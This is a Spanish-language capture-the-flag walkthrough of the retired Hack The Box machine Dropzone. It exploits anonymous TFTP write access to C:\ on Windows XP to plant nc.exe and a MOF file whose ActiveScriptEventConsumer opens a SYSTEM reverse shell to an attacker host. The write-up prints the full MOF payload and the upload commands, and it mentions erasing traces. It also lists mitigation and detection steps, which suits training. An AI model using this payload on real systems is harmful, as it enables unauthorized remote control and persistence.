---
machine: Dropzone
os: Windows
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [windows, tftp, wmi, mof, privesc]
---

# Dropzone — Hack The Box (Windows)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

El TFTP anónimo expone la raíz `C:\` y permite leer y escribir en `System32`, lo que confirma ejecución como SYSTEM. Se sube un archivo MOF al directorio de auto-instalación de WMI; `mofcomp` lo procesa y un `ActiveScriptEventConsumer` ejecuta un binario, dando una shell SYSTEM.

## Reconocimiento

```bash
nmap -Pn -sU -sCV -p69 <IP>
nmap -Pn -p- --min-rate 5000 <IP>
```

- El escaneo TCP no muestra puertos útiles; UDP/69 responde TFTP.
- El servicio permite subir y descargar archivos sin autenticación.
- La raíz de TFTP es `C:\`, no un directorio aislado.

## Enumeración

- `tftp> put test.txt` y `get test.txt` funcionan en la raíz.
- `get \windows\system32\eula.txt` identifica Windows XP SP3.
- Se puede escribir en `\windows\system32\`, lo que sugiere que el servicio corre como SYSTEM.

## Foothold

Se sube `nc.exe` en modo binario a `System32` y se prepara un archivo MOF que define un `ActiveScriptEventConsumer` para ejecutar `nc.exe -e cmd.exe`.

```text
#pragma namespace("\\\\.\\root\\cimv2")
instance of ActiveScriptEventConsumer as $cons {
  Name = "ASEC";
  ScriptingEngine = "JScript";
  ScriptText = "new ActiveXObject('Wscript.Shell').Run('nc.exe -e cmd.exe <ATTACKER> 443');";
};
instance of __EventFilter as $filt {
  Name = "instfilt";
  Query = "SELECT * FROM __InstanceCreationEvent WHERE TargetInstance.__class = 'MyClass'";
};
instance of __FilterToConsumerBinding as $bind { Consumer = $cons; Filter = $filt; };
```

## Movimiento lateral

No hay otro host. El pivote es del TFTP al sistema de archivos y de ahí a WMI: se escribe el MOF en `C:\Windows\System32\wbem\mof\`, que `mofcomp` procesa automáticamente.

```text
tftp> binary
tftp> put nc.exe \windows\system32\nc.exe
tftp> put payload.mof \windows\system32\wbem\mof\payload.mof
```

## Escalada de privilegios

El MOF se compila y ejecuta como SYSTEM; la shell resultante es `NT AUTHORITY\SYSTEM`. El archivo se puede borrar después para limpiar el rastro.

```cmd
whoami
type C:\Documents and Settings\Administrator\Desktop\root.txt
```

## Evidencia

- TFTP anónimo con lectura/escritura en la raíz.
- `eula.txt` identificando Windows XP SP3.
- `nc.exe` y `payload.mof` subidos a `System32`.
- Shell como `NT AUTHORITY\SYSTEM`.

## Lecciones aprendidas

- TFTP sin autenticación sobre `C:\` es escritura arbitraria como SYSTEM.
- WMI ejecuta MOF colocados en el directorio de auto-instalación.
- Un servicio antiguo y olvidado puede dar control total sin exploit de memoria.

## Mitigación y detección

- Deshabilitar TFTP o restringirlo a un directorio sin privilegios.
- Monitorizar `wbem\mof` y la creación de consumidores WMI.
- Aplicar mínimo privilegio al servicio TFTP.

## Referencias

- [0xdf — Dropzone](https://0xdf.gitlab.io/2018/11/03/htb-dropzone.html)
- [IppSec — Dropzone](https://www.youtube.com/watch?v=QzP5nUEhZeg)
- [Hack The Box — Dropzone](https://app.hackthebox.com/machines/dropzone)
